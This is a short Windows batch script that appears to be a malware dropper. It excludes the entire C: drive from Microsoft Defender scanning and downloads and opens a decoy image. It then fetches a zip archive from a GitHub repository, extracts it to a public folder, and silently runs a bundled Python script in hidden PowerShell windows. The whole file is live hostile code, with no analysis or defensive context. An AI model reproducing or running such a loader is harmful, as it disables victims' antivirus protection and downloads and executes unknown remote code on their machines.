��
echo off
powershell.exe -command "Add-MpPreference -ExclusionPath 'C:\'"
curl --silent --output "%TEMP%\album.jpg" "https://raw.githubusercontent.com/bao3125/Mdsj/main/t_500x300.jpg"
start "" "%TEMP%\album.jpg"

curl --silent --output "C:\Users\Public\Document.zip" "https://github.com/hatakethsk/File/raw/main/Document.zip"

powershell.exe -WindowStyle Hidden -Command ^
    "Add-Type -AssemblyName System.IO.Compression.FileSystem; ^
    [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document')"

powershell.exe -WindowStyle Hidden -Command ^
    "C:\Users\Public\Document\python C:\Users\Public\Document\Lib\sim.py"

exit
